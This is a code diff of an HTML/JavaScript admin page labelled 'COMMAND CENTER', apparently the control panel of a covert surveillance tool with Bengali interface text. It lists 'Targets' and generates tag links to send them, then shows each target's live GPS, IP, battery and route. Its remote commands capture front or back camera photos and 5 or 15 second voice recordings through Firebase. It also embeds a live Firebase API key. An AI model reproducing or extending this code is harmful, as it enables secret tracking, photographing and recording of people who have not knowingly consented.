-        #geoAlert .geo-icon { font-size: 36px; margin-bottom: 10px; }
-        #geoAlert h3 { color: var(--red); font-size: 18px; margin-bottom: 6px; }
-        #geoAlert p { color: var(--muted); font-size: 12px; line-height: 1.6; }
-        #geoAlert button { margin-top: 16px; background: var(--red); color: white; border: none; padding: 9px 24px; border-radius: 9px; cursor: pointer; font-weight: 700; font-size: 13px; }
+
+        @keyframes alertAppear {
+            from {
+                transform: translate(-50%, -50%) scale(0.8);
+                opacity: 0
+            }
+
+            to {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 1
+            }
+        }
+
+        #geoAlert .geo-icon {
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+
+        #geoAlert h3 {
+            color: var(--red);
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+
+        #geoAlert p {
+            color: var(--muted);
+            font-size: 12px;
+            line-height: 1.6;
+        }
+
+        #geoAlert button {
+            margin-top: 16px;
+            background: var(--red);
+            color: white;
+            border: none;
+            padding: 9px 24px;
+            border-radius: 9px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: 13px;
+        }
 
         /* Confirm Dialog */
         #confirmDialog {
-            display: none; position: fixed; top: 50%; left: 50%;
-            transform: translate(-50%,-50%); z-index: 9999;
-            background: rgba(8,12,25,0.98); border: 1px solid var(--border-accent);
-            border-radius: 16px; padding: 24px; text-align: center;
-            backdrop-filter: blur(20px); box-shadow: 0 8px 40px rgba(0,0,0,0.7);
-            max-width: 280px; width: 88%;
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+            background: rgba(8, 12, 25, 0.98);
+            border: 1px solid var(--border-accent);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.7);
+            max-width: 280px;
+            width: 88%;
         }
-        #confirmDialog p { font-size: 13px; color: var(--muted); margin-bottom: 16px; line-height: 1.6; }
-        .confirm-btns { display: flex; gap: 8px; }
-        .confirm-btns button { flex:1; padding: 9px; border: none; border-radius: 9px; font-weight: 700; font-size: 12px; cursor: pointer; }
-        .confirm-yes { background: var(--red); color: white; }
-        .confirm-no { background: var(--surface); color: var(--muted); border: 1px solid var(--border) !important; }
+
+        #confirmDialog p {
+            font-size: 13px;
+            color: var(--muted);
+            margin-bottom: 16px;
+            line-height: 1.6;
+        }
+
+        .confirm-btns {
+            display: flex;
+            gap: 8px;
+        }
+
+        .confirm-btns button {
+            flex: 1;
+            padding: 9px;
+            border: none;
+            border-radius: 9px;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .confirm-yes {
+            background: var(--red);
+            color: white;
+        }
+
+        .confirm-no {
+            background: var(--surface);
+            color: var(--muted);
+            border: 1px solid var(--border) !important;
+        }
 
         /* Overlay backdrop */
-        .overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 9998; backdrop-filter: blur(4px); }
-        .overlay.show { display: block; }
+        .overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9998;
+            backdrop-filter: blur(4px);
+        }
 
-        @media (max-width: 400px) { :root { --panel-w: 100vw; } .panel { border-right: none; } .map-hud { left: 12px; } }
-        ::-webkit-scrollbar { width: 3px; }
-        ::-webkit-scrollbar-thumb { background: rgba(56,189,248,0.15); border-radius: 99px; }
+        .overlay.show {
+            display: block;
+        }
+
+        @media (max-width: 400px) {
+            :root {
+                --panel-w: 100vw;
+            }
+
+            .panel {
+                border-right: none;
+            }
+
+            .map-hud {
+                left: 12px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(56, 189, 248, 0.15);
+            border-radius: 99px;
+        }
     </style>
 </head>
+
 <body>
 
-<div id="map"></div>
+    <div id="map"></div>
 
-<!-- HUD chips on map -->
-<div class="map-hud" id="mapHud" style="display:none;">
-    <div class="hud-chip">🌐 <span id="hudIp" class="val">--</span></div>
-    <div class="hud-chip">🔋 <span id="hudBat" class="val">--</span></div>
-    <div class="hud-chip">⚡ <span id="hudSpeed" class="val">0 km/h</span></div>
-</div>
-
-<button id="showPanelBtn" onclick="togglePanel(true)">🛰 Panel</button>
-
-<!-- Toast & Confirm -->
-<div id="toast"></div>
-<div class="overlay" id="overlay"></div>
-
-<!-- Geofence Alert -->
-<div id="geoAlert">
-    <div class="geo-icon">🚨</div>
-    <h3>Geofence Breach!</h3>
-    <p id="geoAlertMsg">Target has left the safe zone!</p>
-    <button onclick="closeGeoAlert()">Dismiss</button>
-</div>
-
-<!-- Confirm Dialog -->
-<div id="confirmDialog">
-    <p id="confirmMsg">Are you sure?</p>
-    <div class="confirm-btns">
-        <button class="confirm-yes" id="confirmYes">Yes, Delete</button>
-        <button class="confirm-no" onclick="closeConfirm()">Cancel</button>
+    <!-- HUD chips on map -->
+    <div class="map-hud" id="mapHud" style="display:none;">
+        <div class="hud-chip">🌐 <span id="hudIp" class="val">--</span></div>
+        <div class="hud-chip">🔋 <span id="hudBat" class="val">--</span></div>
+        <div class="hud-chip">⚡ <span id="hudSpeed" class="val">0 km/h</span></div>
     </div>
-</div>
 
-<!-- Side Panel -->
-<div class="panel" id="mainPanel">
+    <button id="showPanelBtn" onclick="togglePanel(true)">🛰 Panel</button>
 
-    <!-- Header -->
-    <div class="panel-header">
-        <div class="panel-brand">
-            <div class="brand-ping"></div>
-            COMMAND CENTER
+    <!-- Toast & Confirm -->
+    <div id="toast"></div>
+    <div class="overlay" id="overlay"></div>
+
+    <!-- Geofence Alert -->
+    <div id="geoAlert">
+        <div class="geo-icon">🚨</div>
+        <h3>Geofence Breach!</h3>
+        <p id="geoAlertMsg">Target has left the safe zone!</p>
+        <button onclick="closeGeoAlert()">Dismiss</button>
+    </div>
+
+    <!-- Confirm Dialog -->
+    <div id="confirmDialog">
+        <p id="confirmMsg">Are you sure?</p>
+        <div class="confirm-btns">
+            <button class="confirm-yes" id="confirmYes">Yes, Delete</button>
+            <button class="confirm-no" onclick="closeConfirm()">Cancel</button>
         </div>
-        <div class="panel-status-row">
-            <div class="status-indicator">
-                <div class="status-dot" id="statusDot"></div>
-                <span class="status-text" id="statusText">Waiting...</span>
+    </div>
+
+    <!-- Side Panel -->
+    <div class="panel" id="mainPanel">
+
+        <!-- Header -->
+        <div class="panel-header">
+            <div class="panel-brand">
+                <div class="brand-ping"></div>
+                COMMAND CENTER
             </div>
-            <span class="status-time" id="lastSeenTime"></span>
-            <button class="hide-btn" onclick="togglePanel(false)">✕</button>
-        </div>
-    </div>
-
-    <!-- Body -->
-    <div class="panel-body">
-
-        <!-- Address -->
-        <div class="address-box" id="addressBox">
-            <span class="addr-icon">📍</span>
-            <span id="addressUI">GPS data আসছে... target device-এ START TEST চাপুন।</span>
+            <div class="panel-status-row">
+                <span style="font-size:10px;color:var(--muted);">Multi-Target v2.0</span>
+                <button class="hide-btn" onclick="togglePanel(false)">✕</button>
+            </div>
         </div>
 
-        <!-- Device Info -->
-        <div class="section">
-            <div class="section-title">📱 Device Info</div>
-            <div class="info-grid">
-                <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="deviceUI">--</span></div>
-                <div class="info-row"><span class="info-label">Battery</span><span class="info-value green" id="batUI">--</span></div>
-                <div class="info-row"><span class="info-label">IP Address</span><span class="info-value accent" id="ipUI">--</span></div>
-                <div class="info-row"><span class="info-label">ISP / Network</span><span class="info-value" id="ispUI">--</span></div>
-                <div class="info-row"><span class="info-label">GPS Accuracy</span><span class="info-value orange" id="accUI">--</span></div>
-                <div class="info-row">
-                    <span class="info-label">Open in Maps</span>
-                    <a id="mapsLink" href="#" target="_blank" style="font-size:11px;color:var(--accent);font-weight:700;text-decoration:none;">Google Maps ↗</a>
+        <!-- User List -->
+        <div class="user-list-wrap">
+            <div class="ul-header">
+                <span class="ul-title">👥 Targets</span>
+                <span class="ul-count" id="onlineCount">0 Online</span>
+            </div>
+            <div class="user-tabs" id="userTabs">
+                <div style="font-size:11px;color:var(--muted);padding:4px 0;">Firebase থেকে লোড হচ্ছে...</div>
+            </div>
+        </div>
+
+        <!-- Body -->
+        <div class="panel-body">
+
+            <!-- Status Row -->
+            <div class="status-row">
+                <div class="status-dot" id="statusDot"></div>
+                <span class="status-text" id="statusText">Target Select করুন</span>
+                <span class="status-time" id="lastSeenTime"></span>
+            </div>
+
+            <!-- Address -->
+            <div class="address-box" id="addressBox">
+                <span class="addr-icon">📍</span>
+                <span id="addressUI">উপরে Target select করুন।</span>
+            </div>
+
+            <!-- Tag Link Generator -->
+            <div class="tag-gen-box">
+                <div class="tag-gen-title">🔗 Tag Link তৈরি করুন</div>
+                <div class="tag-gen-row">
+                    <input type="number" class="tag-input" id="tagNumInput" placeholder="Tag নম্বর (যেমন: 2)" min="1"
+                        max="999">
+                    <button class="tag-gen-btn" onclick="generateTagLink()">Generate</button>
+                </div>
+                <div class="tag-link-out" id="tagLinkOut" onclick="copyTagLink()">লিংক লোড হচ্ছে...</div>
+            </div>
+
+            <!-- Device Info -->
+            <div class="section">
+                <div class="section-title">📱 Device Info</div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Tag ID</span><span class="info-value accent"
+                            id="tagIdUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Device</span><span class="info-value"
+                            id="deviceUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Battery</span><span class="info-value green"
+                            id="batUI">--</span></div>
+                    <div class="info-row"><span class="info-label">IP Address</span><span class="info-value accent"
+                            id="ipUI">--</span></div>
+                    <div class="info-row"><span class="info-label">ISP / Network</span><span class="info-value"
+                            id="ispUI">--</span></div>
+                    <div class="info-row"><span class="info-label">GPS Accuracy</span><span class="info-value orange"
+                            id="accUI">--</span></div>
+                    <div class="info-row">
+                        <span class="info-label">Open in Maps</span>
+                        <a id="mapsLink" href="#" target="_blank"
+                            style="font-size:11px;color:var(--accent);font-weight:700;text-decoration:none;">Google Maps
+                            ↗</a>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Coordinates -->
-        <div class="section">
-            <div class="section-title">🌐 Coordinates</div>
-            <div class="info-grid">
-                <div class="info-row"><span class="info-label">Latitude</span><span class="info-value accent" id="latUI">--</span></div>
-                <div class="info-row"><span class="info-label">Longitude</span><span class="info-value accent" id="lngUI">--</span></div>
+            <!-- Coordinates -->
+            <div class="section">
+                <div class="section-title">🌐 Coordinates</div>
+                <div class="info-grid">
+                    <div class="info-row"><span class="info-label">Latitude</span><span class="info-value accent"
+                            id="latUI">--</span></div>
+                    <div class="info-row"><span class="info-label">Longitude</span><span class="info-value accent"
+                            id="lngUI">--</span></div>
+                </div>
             </div>
-        </div>
 
-        <!-- Movement -->
-        <div class="section">
-            <div class="section-title">🚀 Movement</div>
-            <div class="move-grid">
-                <div class="move-card"><div class="mv" id="speedUI">0</div><div class="ml">km/h</div></div>
-                <div class="move-card"><div class="mv" id="headingUI">0°</div><div class="ml">Heading</div></div>
-                <div class="move-card"><div class="mv" id="pointsUI">0</div><div class="ml">Points</div></div>
+            <!-- Movement -->
+            <div class="section">
+                <div class="section-title">🚀 Movement</div>
+                <div class="move-grid">
+                    <div class="move-card">
+                        <div class="mv" id="speedUI">0</div>
+                        <div class="ml">km/h</div>
+                    </div>
+                    <div class="move-card">
+                        <div class="mv" id="headingUI">0°</div>
+                        <div class="ml">Heading</div>
+                    </div>
+                    <div class="move-card">
+                        <div class="mv" id="pointsUI">0</div>
+                        <div class="ml">Points</div>
+                    </div>
+                </div>
+                <div class="speed-track">
+                    <div class="speed-fill" id="speedFill"></div>
+                </div>
             </div>
-            <div class="speed-track"><div class="speed-fill" id="speedFill"></div></div>
-        </div>
 
-        <!-- Route History -->
-        <div class="section">
-            <div class="section-title">🗺 Route Log</div>
-            <div class="route-log" id="routeLog">
-                <div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>
+            <!-- Route History -->
+            <div class="section">
+                <div class="section-title">🗺 Route Log</div>
+                <div class="route-log" id="routeLog">
+                    <div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet
+                    </div>
+                </div>
+                <button class="action-btn btn-clear-route full" style="margin-top:8px;font-size:11px;padding:7px;"
+                    id="clearRouteBtn">🗑 Clear Route</button>
             </div>
-            <button class="action-btn btn-clear-route full" style="margin-top:8px;font-size:11px;padding:7px;" id="clearRouteBtn">🗑 Clear Route</button>
-        </div>
 
-        <!-- Remote Commands -->
-        <div class="section">
-            <div class="section-title">🎮 Remote Commands</div>
-            <div class="btn-grid">
-                <button class="action-btn btn-ring" id="ringBtn">🔔 Ring Alert</button>
-                <button class="action-btn btn-audio" id="audioBtn">🎙 Voice 5s</button>
-                <button class="action-btn btn-front" id="photoFrontBtn">📸 Front Cam</button>
-                <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
-                <button class="action-btn btn-audio-long full" id="audioLongBtn">🎙 Voice 15s (Extended)</button>
-                <button class="action-btn btn-geo full" id="geoBtn">🛡 Geofence: OFF</button>
+            <!-- Remote Commands -->
+            <div class="section">
+                <div class="section-title">🎮 Remote Commands</div>
+                <div class="btn-grid">
+                    <button class="action-btn btn-ring" id="ringBtn">🔔 Ring Alert</button>
+                    <button class="action-btn btn-audio" id="audioBtn">🎙 Voice 5s</button>
+                    <button class="action-btn btn-front" id="photoFrontBtn">📸 Front Cam</button>
+                    <button class="action-btn btn-back" id="photoBackBtn">📸 Back Cam</button>
+                    <button class="action-btn btn-audio-long full" id="audioLongBtn">🎙 Voice 15s (Extended)</button>
+                    <button class="action-btn btn-geo full" id="geoBtn">🛡 Geofence: OFF</button>
+                </div>
             </div>
-        </div>
 
-        <!-- Photo Box -->
-        <div class="media-section" id="photoBox">
-            <div class="media-header">
-                <span class="media-title">📷 Photo</span>
-                <span class="media-badge badge-wait" id="photoBadge">Waiting</span>
+            <!-- Photo Box -->
+            <div class="media-section" id="photoBox">
+                <div class="media-header">
+                    <span class="media-title">📷 Photo</span>
+                    <span class="media-badge badge-wait" id="photoBadge">Waiting</span>
+                </div>
+                <img class="spy-img" id="spyImg" src="" alt="">
+                <div class="media-btns" id="photoActions" style="display:none;">
+                    <a class="m-dl" id="downloadPhoto" download="photo.jpg">💾 Save</a>
+                    <button class="m-del" id="deletePhoto">🗑 Delete</button>
+                </div>
             </div>
-            <img class="spy-img" id="spyImg" src="" alt="">
-            <div class="media-btns" id="photoActions" style="display:none;">
-                <a class="m-dl" id="downloadPhoto" download="photo.jpg">💾 Save</a>
-                <button class="m-del" id="deletePhoto">🗑 Delete</button>
+
+            <!-- Audio Box -->
+            <div class="media-section" id="audioBox">
+                <div class="media-header">
+                    <span class="media-title">🎙 Voice</span>
+                    <span class="media-badge badge-wait" id="audioBadge">Waiting</span>
+                </div>
+                <audio class="spy-audio" id="spyAudio" controls></audio>
+                <div class="media-btns" id="audioActions" style="display:none;">
+                    <a class="m-dl" id="downloadAudio" download="voice.webm">💾 Save</a>
+                    <button class="m-del" id="deleteAudio">🗑 Delete</button>
+                </div>
             </div>
-        </div>
 
-        <!-- Audio Box -->
-        <div class="media-section" id="audioBox">
-            <div class="media-header">
-                <span class="media-title">🎙 Voice</span>
-                <span class="media-badge badge-wait" id="audioBadge">Waiting</span>
-            </div>
-            <audio class="spy-audio" id="spyAudio" controls></audio>
-            <div class="media-btns" id="audioActions" style="display:none;">
-                <a class="m-dl" id="downloadAudio" download="voice.webm">💾 Save</a>
-                <button class="m-del" id="deleteAudio">🗑 Delete</button>
-            </div>
-        </div>
+        </div><!-- end panel-body -->
+    </div><!-- end panel -->
 
-    </div><!-- end panel-body -->
-</div><!-- end panel -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+        import { getDatabase, ref, onValue, set, remove, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-    import { getDatabase, ref, onValue, set, remove, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+        const firebaseConfig = {
+            apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
+            authDomain: "arng-805db.firebaseapp.com",
+            projectId: "arng-805db",
+            databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
+        };
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-    const firebaseConfig = {
-        apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk",
-        authDomain: "arng-805db.firebaseapp.com",
-        projectId: "arng-805db",
-        databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/"
-    };
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
-    // ─── Map Setup ────────────────────────────────────────────────
-    const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', {
-        maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
-    });
-    const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-        maxZoom: 19, attribution: '© OpenStreetMap'
-    });
-    const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
-        maxZoom: 20, subdomains: ['mt0','mt1','mt2','mt3'], attribution: '© Google'
-    });
-    const map = L.map('map', { layers: [satLayer], zoomControl: false }).setView([23.8103, 90.4125], 6);
-    L.control.zoom({ position: 'bottomright' }).addTo(map);
-    L.control.layers({
-        '🛰 Satellite': satLayer,
-        '🗺 Street': streetLayer,
-        '🌿 Terrain': terrainLayer
-    }, {}, { position: 'topright' }).addTo(map);
-
-    // ─── State ────────────────────────────────────────────────────
-    let marker = null, accuracyCircle = null;
-    let routeLine = L.polyline([], { color: '#f43f5e', weight: 3, opacity: 0.85, dashArray: '5,4' }).addTo(map);
-    let routePoints = 0, routeHistory = [];
-    let lastLat = 0, lastLng = 0;
-    let geofenceOn = false, geofenceCircle = null, geofenceCenter = null;
-    let lastSeenTimer = null;
-    let geoAlertShown = false;
-    let confirmCallback = null;
-
-    // ─── Panel Toggle ─────────────────────────────────────────────
-    window.togglePanel = (show) => {
-        document.getElementById('mainPanel').classList.toggle('hidden', !show);
-        document.getElementById('showPanelBtn').style.display = show ? 'none' : 'block';
-        if (show) map.invalidateSize();
-    };
-
-    // ─── Toast ────────────────────────────────────────────────────
-    function toast(msg, type = 'info', ms = 3200) {
-        const el = document.getElementById('toast');
-        el.textContent = msg;
-        el.className = type;
-        el.style.display = 'block';
-        clearTimeout(el._t);
-        el._t = setTimeout(() => el.style.display = 'none', ms);
-    }
-
-    // ─── Confirm Dialog ───────────────────────────────────────────
-    window.closeConfirm = () => {
-        document.getElementById('confirmDialog').style.display = 'none';
-        document.getElementById('overlay').classList.remove('show');
-        confirmCallback = null;
-    };
-    function showConfirm(msg, cb) {
-        document.getElementById('confirmMsg').textContent = msg;
-        confirmCallback = cb;
-        document.getElementById('confirmDialog').style.display = 'block';
-        document.getElementById('overlay').classList.add('show');
-    }
-    document.getElementById('confirmYes').addEventListener('click', () => {
-        if (confirmCallback) confirmCallback();
-        closeConfirm();
-    });
-    document.getElementById('overlay').addEventListener('click', closeConfirm);
-
-    // ─── Geofence Alert ───────────────────────────────────────────
-    window.closeGeoAlert = () => {
-        document.getElementById('geoAlert').style.display = 'none';
-        geoAlertShown = false;
-    };
-
-    // ─── Time Ago ─────────────────────────────────────────────────
-    function timeAgo(ts) {
-        const s = Math.floor((Date.now() - ts) / 1000);
-        if (s < 10) return 'Now';
-        if (s < 60) return `${s}s ago`;
-        if (s < 3600) return `${Math.floor(s/60)}m ago`;
-        return `${Math.floor(s/3600)}h ago`;
-    }
-
-    // ─── Address Fetch ────────────────────────────────────────────
-    let lastAddrTs = 0;
-    async function fetchAddress(lat, lng) {
-        const now = Date.now();
-        if (now - lastAddrTs < 12000) return;
-        lastAddrTs = now;
-        try {
-            const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=bn,en`);
-            const d = await r.json();
-            const addr = d.display_name || 'Unknown location';
-            document.getElementById('addressUI').textContent = addr;
-            document.getElementById('addressBox').className = 'address-box';
-            // Add to route log
-            addRouteLog(lat, lng, addr.split(',')[0]);
-        } catch {}
-    }
-
-    // ─── Route Log ────────────────────────────────────────────────
-    function addRouteLog(lat, lng, label) {
-        const log = document.getElementById('routeLog');
-        const time = new Date().toLocaleTimeString('en-US', { hour:'2-digit', minute:'2-digit', second:'2-digit' });
-        routeHistory.push({ lat, lng, label, time });
-        if (log.children[0]?.style?.textAlign === 'center') log.innerHTML = '';
-        const item = document.createElement('div');
-        item.className = 'route-log-item';
-        item.innerHTML = `<span>${label || `${lat.toFixed(4)}, ${lng.toFixed(4)}`}</span><span>${time}</span>`;
-        log.insertBefore(item, log.firstChild);
-        // Keep max 20 items
-        while (log.children.length > 20) log.removeChild(log.lastChild);
-    }
-
-    // ─── Clear Stale Media on Load ────────────────────────────────
-    remove(ref(db, 'live_location/photo'));
-    remove(ref(db, 'live_location/audio'));
-
-    // ─── Ring Button ──────────────────────────────────────────────
-    document.getElementById('ringBtn').addEventListener('click', () => {
-        set(ref(db, 'live_location/command'), { ringTime: Date.now() });
-        toast('🔔 Ring পাঠানো হয়েছে!', 'success');
-    });
-
-    // ─── Photo Buttons ────────────────────────────────────────────
-    function requestPhoto(camType) {
-        set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType });
-        document.getElementById('photoBox').classList.add('visible');
-        document.getElementById('photoBadge').textContent = 'Requesting...';
-        document.getElementById('photoBadge').className = 'media-badge badge-wait';
-        document.getElementById('spyImg').className = 'spy-img';
-        document.getElementById('photoActions').style.display = 'none';
-        toast(`📸 ${camType === 'user' ? 'Front' : 'Back'} camera request পাঠানো হয়েছে...`, 'info');
-    }
-    document.getElementById('photoFrontBtn').addEventListener('click', () => requestPhoto('user'));
-    document.getElementById('photoBackBtn').addEventListener('click', () => requestPhoto('environment'));
-
-    // ─── Audio Buttons ────────────────────────────────────────────
-    function requestAudio(duration = 5000) {
-        set(ref(db, 'live_location/command'), { audioTime: Date.now(), audioDuration: duration });
-        document.getElementById('audioBox').classList.add('visible');
-        document.getElementById('audioBadge').textContent = `Recording ${duration/1000}s...`;
-        document.getElementById('audioBadge').className = 'media-badge badge-wait';
-        document.getElementById('spyAudio').className = 'spy-audio';
-        document.getElementById('audioActions').style.display = 'none';
-        toast(`🎙 ${duration/1000}s recording request পাঠানো হয়েছে!`, 'info');
-    }
-    document.getElementById('audioBtn').addEventListener('click', () => requestAudio(5000));
-    document.getElementById('audioLongBtn').addEventListener('click', () => requestAudio(15000));
-
-    // ─── Delete Buttons ───────────────────────────────────────────
-    document.getElementById('deletePhoto').addEventListener('click', () => {
-        showConfirm('Photo Firebase থেকে মুছে ফেলবো?', () => {
-            remove(ref(db, 'live_location/photo'));
-            document.getElementById('photoBox').classList.remove('visible');
-            toast('🗑 Photo মুছা হয়েছে।', 'success');
+        // ─── Map Setup ────────────────────────────────────────────────
+        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', {
+            maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3'], attribution: '© Google'
         });
-    });
-    document.getElementById('deleteAudio').addEventListener('click', () => {
-        showConfirm('Audio Firebase থেকে মুছে ফেলবো?', () => {
-            remove(ref(db, 'live_location/audio'));
-            document.getElementById('audioBox').classList.remove('visible');
-            toast('🗑 Audio মুছা হয়েছে।', 'success');
+        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            maxZoom: 19, attribution: '© OpenStreetMap'
         });
-    });
+        const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', {
+            maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3'], attribution: '© Google'
+        });
+        const map = L.map('map', { layers: [satLayer], zoomControl: false }).setView([23.8103, 90.4125], 6);
+        L.control.zoom({ position: 'bottomright' }).addTo(map);
+        L.control.layers({
+            '🛰 Satellite': satLayer,
+            '🗺 Street': streetLayer,
+            '🌿 Terrain': terrainLayer
+        }, {}, { position: 'topright' }).addTo(map);
 
-    // ─── Clear Route ──────────────────────────────────────────────
-    document.getElementById('clearRouteBtn').addEventListener('click', () => {
-        showConfirm('Route history মুছে ফেলবো?', () => {
-            routeLine.setLatLngs([]);
-            routePoints = 0;
-            routeHistory = [];
-            document.getElementById('pointsUI').textContent = '0';
+        // ─── State ────────────────────────────────────────────────────
+        let markers = {}; // tagId → marker
+        let accuracyCircles = {}; // tagId → circle
+        let routeLines = {}; // tagId → polyline
+        let routePoints = {}, routeHistories = {};
+
+        let activeTagId = null; // currently selected tag
+        let currentData = {}; // live data per tag
+
+        let lastLat = 0, lastLng = 0;
+        let geofenceOn = false, geofenceCircle = null, geofenceCenter = null;
+        let lastSeenTimer = null;
+        let geoAlertShown = false;
+        let confirmCallback = null;
+
+        // Tag colors for markers
+        const TAG_COLORS = ['#f43f5e', '#38bdf8', '#10b981', '#f59e0b', '#8b5cf6', '#ec4899', '#06b6d4', '#84cc16'];
+
+        // ─── Panel Toggle ─────────────────────────────────────────────
+        window.togglePanel = (show) => {
+            document.getElementById('mainPanel').classList.toggle('hidden', !show);
+            document.getElementById('showPanelBtn').style.display = show ? 'none' : 'block';
+            if (show) map.invalidateSize();
+        };
+
+        // ─── Toast ────────────────────────────────────────────────────
+        function toast(msg, type = 'info', ms = 3200) {
+            const el = document.getElementById('toast');
+            el.textContent = msg;
+            el.className = type;
+            el.style.display = 'block';
+            clearTimeout(el._t);
+            el._t = setTimeout(() => el.style.display = 'none', ms);
+        }
+
+        // ─── Confirm Dialog ───────────────────────────────────────────
+        window.closeConfirm = () => {
+            document.getElementById('confirmDialog').style.display = 'none';
+            document.getElementById('overlay').classList.remove('show');
+            confirmCallback = null;
+        };
+        function showConfirm(msg, cb) {
+            document.getElementById('confirmMsg').textContent = msg;
+            confirmCallback = cb;
+            document.getElementById('confirmDialog').style.display = 'block';
+            document.getElementById('overlay').classList.add('show');
+        }
+        document.getElementById('confirmYes').addEventListener('click', () => {
+            if (confirmCallback) confirmCallback();
+            closeConfirm();
+        });
+        document.getElementById('overlay').addEventListener('click', closeConfirm);
+
+        // ─── Geofence Alert ───────────────────────────────────────────
+        window.closeGeoAlert = () => {
+            document.getElementById('geoAlert').style.display = 'none';
+            geoAlertShown = false;
+        };
+
+        // ─── Time Ago ─────────────────────────────────────────────────
+        function timeAgo(ts) {
+            const s = Math.floor((Date.now() - ts) / 1000);
+            if (s < 10) return 'Now';
+            if (s < 60) return `${s}s ago`;
+            if (s < 3600) return `${Math.floor(s / 60)}m ago`;
+            return `${Math.floor(s / 3600)}h ago`;
+        }
+
+        // ─── Address Fetch ────────────────────────────────────────────
+        let lastAddrTs = 0;
+        async function fetchAddress(lat, lng) {
+            const now = Date.now();
+            if (now - lastAddrTs < 12000) return;
+            lastAddrTs = now;
+            try {
+                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}&accept-language=bn,en`);
+                const d = await r.json();
+                const addr = d.display_name || 'Unknown location';
+                document.getElementById('addressUI').textContent = addr;
+                document.getElementById('addressBox').className = 'address-box';
+                addRouteLog(lat, lng, addr.split(',')[0]);
+            } catch { }
+        }
+
+        // ─── Route Log ────────────────────────────────────────────────
+        function addRouteLog(lat, lng, label) {
+            const log = document.getElementById('routeLog');
+            const time = new Date().toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+            if (log.children[0]?.style?.textAlign === 'center') log.innerHTML = '';
+            const item = document.createElement('div');
+            item.className = 'route-log-item';
+            item.innerHTML = `<span>${label || `${lat.toFixed(4)}, ${lng.toFixed(4)}`}</span><span>${time}</span>`;
+            log.insertBefore(item, log.firstChild);
+            while (log.children.length > 20) log.removeChild(log.lastChild);
+        }
+
+        // ─── Tag Link Generator ──────────────────────────────────────
+        window.generateTagLink = () => {
+            const num = document.getElementById('tagNumInput').value.trim();
+            if (!num || isNaN(num) || parseInt(num) < 1) {
+                toast('⚠️ একটি valid নম্বর দিন!', 'error'); return;
+            }
+            const base = window.location.href.replace('admin.html', 'index.html').split('?')[0];
+            const link = `${base}?tag=${parseInt(num)}`;
+            const out = document.getElementById('tagLinkOut');
+            out.textContent = `📋 Click to copy: ${link}`;
+            out.dataset.link = link;
+            out.classList.add('show');
+        };
+
+        window.copyTagLink = () => {
+            const link = document.getElementById('tagLinkOut').dataset.link;
+            if (link) {
+                navigator.clipboard.writeText(link).then(() => toast('✅ Link copied!', 'success'));
+            }
+        };
+
+        // ─── Render Panel for selected tag ───────────────────────────
+        function renderPanelForTag(tagId) {
+            const data = currentData[tagId];
+            if (!data) return;
+
+            // Reset route state for this tag
+            lastLat = 0; lastLng = 0;
+            lastAddrTs = 0;
             document.getElementById('routeLog').innerHTML = '<div style="font-size:11px;color:var(--muted);text-align:center;padding:8px 0;">No route data yet</div>';
-            toast('Route cleared.', 'info');
-        });
-    });
+            document.getElementById('pointsUI').textContent = '0';
+            if (!routePoints[tagId]) routePoints[tagId] = 0;
 
-    // ─── Geofence Button ─────────────────────────────────────────
-    document.getElementById('geoBtn').addEventListener('click', () => {
